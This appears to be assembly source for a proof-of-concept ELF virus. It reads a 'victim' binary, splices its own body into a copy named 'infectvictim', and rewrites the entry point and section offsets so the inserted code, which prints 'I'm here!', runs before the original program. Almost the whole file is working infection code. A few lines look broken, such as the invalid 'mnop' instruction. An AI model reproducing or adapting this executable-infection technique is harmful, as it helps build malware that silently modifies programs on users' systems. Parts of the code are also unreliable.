
.data
victim: .string "./victim"
result: .string "./infectvictim"
newshoff:
entrysize:
newentry:
.long 0
tmphandle: .long 0
symtpos:
symindex: .long 0
oldpoint: .long 0
message: .string "Hel!\n"
buffer: .byte 0
.global _start

_start:
//open source file to read - this is our victim
//result of open command is in %eax
//save into the stack
  movl	$victim, %ebx
  movl	$0x2, %ecx
  xorl	%edx, %edx
  call	fopen
  pushl	%eax
//opening the file - result, infected object is placed into it
//Flags for opening the file O_RDWR | O_CREAT | O_TRUNC
//Saving descriptor in the variable
  movl	$result, %ebx
  movl	$01102, %ecx
  movl	$00700, %edx
  call	fopen
  movl	%eax, tmphandle
//get the old program entry point
  popl	%ebx
  movl	$0x18, %ecx
  xorl	%edx, %edx
  call	fseek
//read it into the variable
  movl	$address, %ecx
  movl	$0x4, %edx
  call	fread
//get the old offset of the header sections
  movl	$0x20, %ecx
  xorl	%edx, %edx
  call	fseek
//write it into the variable
  movl	$oldpoint, %ecx
  movl	$0x4, %edx
  call	fread
//get the size of the header sections
  movl	$0x2e, %ecx
  xorl	%edx, %edx
  call	fseek
//Write to variable
  movl	$entrysize, %ecx
  movl	$0x4, %edx
  call	fread
//Compute new entry point to infected program
  movl	$symindex, %ecx
  movl	$0x2, %edx
  call	fread
  pushl	%ebx
  xorl	%eax, %eax
  xorl	%ebx, %ebx
  movw	symindex, %bx
  movw	entrysize, %ax
  mull	%ebx
  addl	oldpoint, %ecx
  movl	%eax, oldpoint
  addl	$0x10, oldpoint
  popl %ebx
  movl	oldpoint, %ecx
  xorl	%edx, %edx
  call	fseek
  movl	oldpoint, %eax
  movl	%eax, symtpos
  movl	$oldpoint, %ecx
  movl	$0x4, %edx
  call fread
//prepare the second part for writing
  xorl	%ecx, %ecx
  movl	$2, %edx
  call	fseek
  subl	oldpoint, %eax
  pushl	%eax
//copy file
// SEEK_SET
  xorl	%edx, %edx
// entry point
  xorl	%ecx, %ecx
// seek in file
  movl	$0x13, %eax
  int	$0x80
  cmpl	$0xfffff001, %eax
  jae	error1
  movl	oldpoint, %ecx
looper:
  pushl	%ecx
  movl	$buffer, %ecx
  movl	$0x1, %edx
  call	fread
  pushl	%ebx
  movl	tmphandle, %ebx
  movl	$buffer, %ecx
  movl	$0x1, %edx
  call	fwrite
  popl	%ebx
  popl	%ecx
  loop looper
//writing body from start to end
  pushl	%ebx
  movl	tmphandle, %ebx
  movl	$bodystart, %ecx
  movl	$(bodyend-bodystart), %edx
  call	fwrite
  popl	%ebx
//adding
  popl	%ecx
looper2:
  pushl	%ecx
  movl	$buffer, %ecx
  movl	$0x1, %edx
  call	fread
  pushl	%ebx
  movl	tmphandle, %ebx
  movl	$buffer, %ecx
  movl	$0x1, %edx
  call	fwrite
  popl	%ebx
  popl	%ecx
  loop	looper2
  call	fclose
//set the new offset of the header table section
  movl	tmphandle, %ebx
  movl	$0x20, %ecx
  xorl	%edx, %edx
  call	fseek
  movl	$newshoff, %ecx
  movl	$0x4, %edx
  call	fread
  addl	$(bodyend-bodystart), newshoff
  movl	$0x20, %ecx
  xorl	%edx, %edx
  call	fseek
  movl	$newshoff, %ecx
  movl	$0x4, %edx
  call fwrite
//New entry point
  movl	$0x18, %ecx
  xorl	%edx, %edx
  call	fseek
  addl	$0x08048000, oldpoint
  movl	$oldpoint, %ecx
  movl	$0x4, %edx
  call	fwrite
  addl	$(bodyend-bodystart), symtpos
  movl	symtpos, %ecx
  xorl	%edx, %edx
  call	fseek 
  addl	$(bodyend-bodystart), oldpoint
  subl	$0x08048000, oldpoint
  movl	$oldpoint, %ecx
  movl	$0x4, %edx
  call	fwrite
//Closing files
  mnop
 close:
  call	fclose
  jmp	ne
  nop
 error1:
  xorl	%ebx, %ebx
  movl	$message, %ecx
  movl	$0x5, %edx
  call	fwrite
  nop
 ne:
 //stdout
  xorl	%ebx, %ebx
  movl	$0x1, %eax
  int	$0x80
 bodystart:
  call	get_ip
 get_ip:
  popl	%ebp
  subl	$0x5, %ebp
  movl	$0xa, %edx
  movl	$(shere-bodystart), %ecx
  addl	%ebp, %ecx
  xorl	%ebx, %ebx
  movl	$0x4, %eax
  int	$0x80
  movl	$(address-bodystart), %ebx
  addl	%ebp, %ebx
  movl	(%ebx), %eax
  call	*%eax
  nop
address:
  .long 0
shere:
  .string "I'm here!\n"
bodyend:
error:
  cmpl	$0xfffff001, %eax
  jae	error1
  ret
  nop
fread:
  movl	$0x03, %eax
  int	$0x80
  call	error
  ret
  nop
fwrite:
  movl	$0x04, %eax
  int	$0x80
  call	error
  ret
fopen:
  movl	$0x05, %eax
  int	$0x80
  call	error
  ret
fclose:
  movl	$0x06, %eax
  int	$0x80
  call	error
  ret
fseek:
  movl	$0x13, %eax
  int	$0x80
  call	error
  ret
  